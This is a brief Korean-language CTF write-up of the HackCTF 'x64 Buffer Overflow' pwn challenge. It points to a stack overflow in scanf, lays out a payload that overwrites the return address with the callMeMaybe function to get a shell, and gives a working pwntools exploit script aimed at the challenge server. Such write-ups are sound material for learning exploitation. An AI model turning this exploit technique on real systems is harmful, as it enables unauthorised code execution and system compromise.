---
title: "[ HackCTF ] x64 Buffer Overflow"
date: 2023-03-07T13:40:02.951Z
categories: ['Wargame', 'HackCTF']
tags: ['HackCTF', "pwn"]
---

### **문제 분석**
---
![](/images/c6d8b638-2d43-4a27-b1ae-1bc15c4df9b2-image.png)

main함수에서 scanf를 보면 BOF 취약점이 존재한다.

<br>

![](/images/827bfe9e-a5f0-4167-9e90-86511c572497-image.png)

callMeMaybe함수에서는 shell을 획득할 수 있다.


<br>
<br>

### **문제 풀이**
---

변수 s는 ebp-0x110에 위치하므로 다음과 같이 payload를 작성할 수 있다.

```dummy(0x110byte) + sfp(8byte) + 0x0000000000400606(callMeMaybe address)```

<br>

exploit 코드는 다음과 같다.

```python
from pwn import *

p = remote('ctf.j0n9hyun.xyz', 3004)

payload = ''
payload += '\x90'*0x110
payload += '\x90'*0x8
payload += p64(0x0000000000400606)

p.sendline(payload)

p.interactive()
```